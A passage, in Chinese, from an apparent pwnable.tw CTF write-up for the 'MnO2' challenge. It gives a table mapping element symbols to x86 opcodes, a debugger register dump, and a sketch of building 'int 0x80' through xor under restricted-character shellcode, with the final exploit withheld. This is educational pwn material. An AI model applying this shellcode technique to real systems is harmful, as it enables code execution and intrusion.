[Te]	push esp ; xxxx
[I]		dec ecx
[Xe]	pop eax ; xxxx
[Cs]	inc ebx ; jae xx
[Ba]	inc edx ; popa
[La]	dec esp ; popa
[Ce]	inc ebx ; xxxx
[Pr]	push eax ; jb xx
[Nd]	dec esi ; xxxx
[Pm]	push eax ; ins es:[edi], dx
[Sm]	push ebx ; ins es:[edi], dx
[Eu]	inc ebp ; jne xx
[Gd]	inc edi ; xxxx
[Tb]	push esp ; xxxx
[Dy]	inc esp ; jns xx
[Ho]	dec eax ; xxxx
[Er]	inc ebp ; jb xx
[Tm]	push esp ; ins es:[edi], dx
[Yb]	pop ecx ; xxxx
[Lu]	dec esp ; jne xx
[Hf]	dec eax ; xxxx
[Ta]	push esp ; popa
[W]		push edi
[Re]	push edx ; xxxx
[Os]	dec edi ; jae xx
[Ir]	dec ecx ; jb xx
[Pt]	push eax ; je xx
[Au]	inc ecx ; jne xx
[Hg]	dex eax ; xxxx
[Tl]	push esp ; ins es:[edi], dx
[Pb]	push eax ; xxxx
[Bi]	inc edx ; imul esi, [eax], xx
[Po]	push eax ; outs dx, ds:[esi]
[At]	inc ecx ; je xx
[Rn]	push edx ; outs dx, ds:[esi]
[Fr]	inc esi ; jb xx
[Ra]	push edx ; popa
[Ac]	inc ecx ; xxxx
[Th]	push esp ; push xxxx
[Pa]	push eax ; popa
[U]		push ebp
[Np]	dec esi ; jo xx
[Pu]	push eax ; jne xx
[Am]	inc ecx ; ins es:[edi], dx
[Cm]	inc ebx ; ins es:[edi], dx
[Bk]	inc edx ; imul esi, [eax], xx
[Cf]	inc ebx ; xxxx
[Es]	inc ebp ; jae xx
[Fm]	inc esi ; ins es:[edi], dx
[Md]	dec ebp ; xxxx
[No]	dec esi ; outs dx, ds:[esi]
[Lr]	dec esp ; jb xx
[Rf]	push edx ; xxxx
[Db]	inc esp ; xxxx
[Sg]	push xx ; xxxx
[Bh]	inc edx ; push xxxx
[Hs]	dec eax ; jae xx
[Mt]	dec ebp ; je xx
[Ds]	inc esp, jae xx
[Rg]	push edx ; xxxx
[Cn]	inc ebx ; outs dx, ds:[esi]
[Fl]	inc esi ; ins es:[edi], dx
[Lv]	dec esp ; jbe xx
```

再看看运行 shellcode 的时候寄存器的状态。可以发现 `eax` 指向了输入的 shellcode，`ebx` 和 `ecx` 分别为 0：

```
─────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────
 EAX  0x324f6e4d ◂— dec    ebp /* 0x324f6e4d; 'MnO2' */
 EBX  0x0
 ECX  0x0
 EDX  0x80488a1 ◂— dec    edi /* 'O' */
 EDI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 ESI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0xffffd718 ◂— 0x0
 ESP  0xffffd6dc —▸ 0x80487ea (main+169) ◂— mov    dword ptr [esp], 0
 EIP  0x324f6e4d ◂— dec    ebp /* 0x324f6e4d; 'MnO2' */
───────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────
 ► 0x324f6e4d    dec    ebp
   0x324f6e4e    outsb  dx, byte ptr [esi]
   0x324f6e4f    dec    edi
   0x324f6e50    xor    al, byte ptr [eax]
   0x324f6e52    add    byte ptr [eax], al
   0x324f6e54    add    byte ptr [eax], al
   0x324f6e56    add    byte ptr [eax], al
   0x324f6e58    add    byte ptr [eax], al
   0x324f6e5a    add    byte ptr [eax], al
   0x324f6e5c    add    byte ptr [eax], al
   0x324f6e5e    add    byte ptr [eax], al
```

然后基本上就是继续找有用的部分来构造 `int 0x80`。试了好久发现 `Cf` 元素数字的组合发现可以构造出指定地址内容异或的指令：

```python
In [1]: print disasm('Cf151111')
   0:   43                      inc    ebx
   1:   66 31 35 31 32 33 34    xor    WORD PTR ds:0x31313131,si
```

而且题目没有开 ASLR，可以在固定的地址放上数据，通过异或构造出 `int 0x80`，最后根据寄存器的状态利用 `popa` 设置好寄存器的值，来触发 `read`，再把真正的 shellcode 传进去。

400 分的题就不放 Exploit 了。

# References

https://blog.csdn.net/qq_29343201/article/details/78109066
https://abda.nl/posts/2018/06/pwnable.tw-orw/
http://p4nda.top/2017/09/29/pwnable-tw-deathnote/
https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/
https://www.cnblogs.com/p4nda/p/7992951.html
https://github.com/HyperSine/pwnable.tw/blob/master/Alive%20Note/solve.py
https://n132.github.io/2019/02/23/2019-02-23-mno2/
